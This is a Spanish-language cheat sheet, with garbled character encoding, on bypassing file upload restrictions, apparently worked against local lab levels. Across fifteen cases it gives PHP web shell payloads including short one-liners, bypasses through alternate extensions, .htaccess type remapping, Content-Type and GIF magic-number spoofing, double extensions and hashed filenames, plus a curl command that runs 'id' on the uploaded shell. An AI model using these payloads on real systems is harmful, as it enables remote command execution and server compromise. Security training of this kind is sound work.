> ğŸ¯ _GuÃ­a prÃ¡ctica para identificar, explotar y bypassar restricciones en sistemas de subida de archivos_

---

## ğŸ§ª Caso 1: Sin sanitizaciÃ³n âŒ

ğŸ› ï¸ **Payload:**

php

Copiar cÃ³digo

`<?php system($_GET['cmd']); ?>`

ğŸ” **Pasos:**

1. Subimos el script PHP sin restricciones.
    
2. Usamos herramientas como **Gobuster** para encontrar la ruta de subida.
    
3. Ejecutamos comandos directamente vÃ­a `?cmd=id`.
    

âœ… **Exploit:**  
`http://localhost/uploads/cmd.php?cmd=id`

---

## ğŸ§ª Caso 2: RestricciÃ³n por extensiÃ³n (validaciÃ³n client-side) ğŸ­

ğŸ¯ Extensiones permitidas: `.gif`, `.jpg`, `.png`

ğŸ” **Bypass:**

1. Inspeccionamos con `Ctrl + Shift + C` en el navegador.
    
2. Eliminamos la validaciÃ³n HTML (JS).
    
3. Subimos el archivo PHP sin problemas.
    

ğŸ’¡ _La validaciÃ³n solo estaba en el navegador, no en el servidor._

---

## ğŸ§ª Caso 3: ValidaciÃ³n server-side âŒ `.php` bloqueado

ğŸ§  Referencia: HackTricks â€“ File Upload Tricks

ğŸ“Œ **Bypass usando `.php5`**  
Subimos `cmd.php5` â†’  
âœ… `http://localhost:9001/upload10/uploads/cmd.php5?cmd=id`

---

## ğŸ§ª Caso 4: `.pht` como extensiÃ³n alternativa

ğŸ“Œ **Bypass con `.pht`**

âœ… `http://localhost:9001/upload11/uploads/cmd.pht?cmd=id`

---

## ğŸ§ª Caso 5: `.htaccess` para redefinir el intÃ©rprete ğŸ“œ

ğŸ§© Subimos archivo `.htaccess` con:

apache

Copiar cÃ³digo

`AddType application/x-httpd-php .test`

Luego subimos `pwned.test`:

php

Copiar cÃ³digo

`<?php system($_GET['cmd']); ?>`

ğŸ¯ **Content-Type:** Cambiar entre `text/plain` y `application/x-php`

âœ… EjecuciÃ³n: `http://localhost/pwned.test?cmd=id`

---

## ğŸ§ª Caso 6: RestricciÃ³n de tamaÃ±o ğŸ“

ğŸ“Œ **MAX_FILE_SIZE interceptado con Burp:**

- Cambiar de `30` a `80`
    

ğŸ©¹ **Alternativa:** Reducir payload con One-Liner:

php

Copiar cÃ³digo

``<?=`$_GET[0]`?>``

---

## ğŸ§ª Caso 7: ValidaciÃ³n de tamaÃ±o en el servidor ğŸ§±

ğŸ” Enviamos al **Repeater**  
ğŸ“Œ Bypass con versiÃ³n corta del payload:

php

Copiar cÃ³digo

``<?=`$_GET[cmd]`?>``

---

## ğŸ§ª Caso 8: RestricciÃ³n por tipo de archivo ğŸ”

ğŸ“‹ Modificamos el **Content-Type**:

- Original: `application/x-php`
    
- Bypass: `image/jpg`
    

ğŸ“Œ TambiÃ©n se puede modificar el **magic number**:

php

Copiar cÃ³digo

`GIF8; <?php system($_GET['cmd']); ?>`

---

## ğŸ§ª Caso 9: ValidaciÃ³n GIF (magic number) ğŸ­

ğŸ“Œ Payload con magic number y Content-Type:

http

Copiar cÃ³digo

`Content-Type: image/gif GIF8; <?php system($_GET['cmd']); ?>`

âœ… Ejecutar como `.php` en URL

---

## ğŸ§ª Caso 10: Hashing del nombre de archivo con MD5 ğŸ”

ğŸ“Œ Comando:

bash

Copiar cÃ³digo

`echo -n "cmd" | md5sum`

ğŸ“ Resultado:  
`http://localhost:9001/upload31/uploads/<hash>.php?cmd=id`

---

## ğŸ§ª Caso 11: Hash del nombre completo (`cmd.php`) con MD5

bash

Copiar cÃ³digo

`echo -n "cmd.php" | md5sum`

âœ… Ejecutar:  
`http://localhost:9001/upload32/uploads/<hash>.php?cmd=id`

---

## ğŸ§ª Caso 12: Hash con SHA1 ğŸ§¾

ğŸ“Œ Se requiere **Gobuster** para descubrir rutas basadas en hash SHA1

---

## ğŸ§ª Caso 13: Doble extensiÃ³n ğŸ“

ğŸ“Œ Payload:  
`cmd.jpg.php`

ğŸ§  Bypass comÃºn en servidores que validan solo la Ãºltima extensiÃ³n.

---

## ğŸ§ª Caso 14: El archivo se descarga ğŸ§²

ğŸ“Œ SoluciÃ³n:

bash

Copiar cÃ³digo

`curl -s -X GET "http://localhost:9001/upload56/testing/cmd.php" -G --data-urlencode "cmd=id"`

âœ… Resultado:  
`uid=33(www-data) gid=33(www-data) groups=33(www-data)`

---

## ğŸ§ª Caso 15: Bypass con `.htaccess` (nuevamente) ğŸ§©

ğŸ“„ Cargamos `.htaccess` para redefinir tipo MIME  
Luego subimos archivo con extensiÃ³n `.test` y ejecutamos PHP

---

### ğŸ“š Recursos Ãºtiles:

- HackTricks â€“ File Upload
    
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Upload)
